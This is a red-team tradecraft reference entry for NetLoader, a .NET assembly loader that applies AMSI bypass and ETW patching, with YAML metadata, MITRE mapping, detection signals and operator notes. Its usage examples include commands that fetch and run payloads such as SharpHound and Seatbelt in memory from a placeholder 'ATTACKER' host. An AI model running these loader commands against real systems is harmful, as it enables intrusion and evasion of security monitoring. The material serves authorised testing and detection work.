---
name: NetLoader / AssemblyLoader
category: defense-evasion
subcategories: [assembly-loading, amsi-bypass, clm-bypass, reflective-loading]
tradecraft_tags: [loader, amsi-bypass, clm-bypass, reflective, dotnet, powershell, in-memory]
mitre_attack:
  - id: T1620
    name: Reflective Code Loading
source:
  url: https://github.com/Flangvik/NetLoader
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: Loader.exe
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  NetLoader loads .NET assemblies reflectively — avoiding the standard AppDomain
  creation pattern. AMSI bypass built-in means the loaded assembly isn't scanned.
  Behavioral EDR detects the assembly load itself (CLR event). Memory scanning finds
  the loaded assembly's PE header in memory.
usage_examples:
  - description: Load and execute a .NET assembly in-memory with built-in AMSI bypass
    args: "Loader.exe -path C:\\Windows\\Temp\\tool.exe -args '-c All'"
  - description: Load from HTTP URL (in-memory, no disk write)
    args: "Loader.exe -path http://ATTACKER/Seatbelt.exe -args '-group=system'"
  - description: Load with ETW patching as well
    args: "Loader.exe -path C:\\Windows\\Temp\\tool.exe -args '-c All' -etw"
opsec_notes: |
  NetLoader wraps .NET assembly loading with AMSI bypass and optional ETW patching
  before executing the payload. The loader itself is the tool that needs to be uploaded;
  subsequent payloads can be loaded from HTTP (no disk write for the payload).
  HTTP-based loading means the payload bytes traverse the network — detectable by
  network DPI. For Apollo operations, inline_assembly already handles AMSI bypass
  at the AppDomain level — NetLoader's value is primarily for PowerShell contexts or
  when the tool binary itself (not via Apollo) is the execution vehicle.
gotchas: |
  NetLoader's AMSI bypass and ETW patching are the same techniques as any other
  bypass — they work until EDR vendors update signatures. Not actively maintained.
  For Apollo inline_assembly, AMSI is already bypassed by the loader — NetLoader is
  redundant in that context. Most useful as a PowerShell-side loader when running
  tools directly from a PowerShell session (not via Apollo).
related_ttps: [amsi-bypass, bofnet, inline-execute-pe, donut, inceptor]
alternatives: [apollo-inline-assembly, bofnet-execute]
common_args:
  -path:
    description: Path to .NET assembly or HTTP URL to load
    typical_values: ["C:\\\\Windows\\\\Temp\\\\tool.exe", "http://ATTACKER/tool.exe"]
    required: true
  -args:
    description: Arguments to pass to the loaded assembly
    typical_values: ["'-c All'", "'-group=system'"]
  -etw:
    description: Patch ETW in addition to AMSI before loading
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# NetLoader / AssemblyLoader

Flangvik's .NET assembly loader with built-in AMSI bypass and optional ETW patching.
NetLoader loads a .NET assembly from disk or HTTP URL into memory and executes it after
applying evasion patches. The primary use case: loading large .NET tools from HTTP
without writing them to disk on the target.

## When to Use vs Apollo inline_assembly

| Context | Use |
|---------|-----|
| Apollo agent | inline_assembly (AMSI already bypassed) |
| Direct PowerShell session | NetLoader (no Apollo, need AMSI bypass + loader) |
| Living-off-the-land scenario | NetLoader (no Apollo upload needed — load from HTTP) |

## HTTP Loading (No Disk Write)

```cmd
Loader.exe -path http://ATTACKER:8080/SharpHound.exe -args "-c All --ZipFilename out.zip"
```
The SharpHound bytes are loaded directly into memory — no SharpHound.exe on disk.
Loader.exe itself must be present (or executed from an approved location), but the
payload never touches disk.
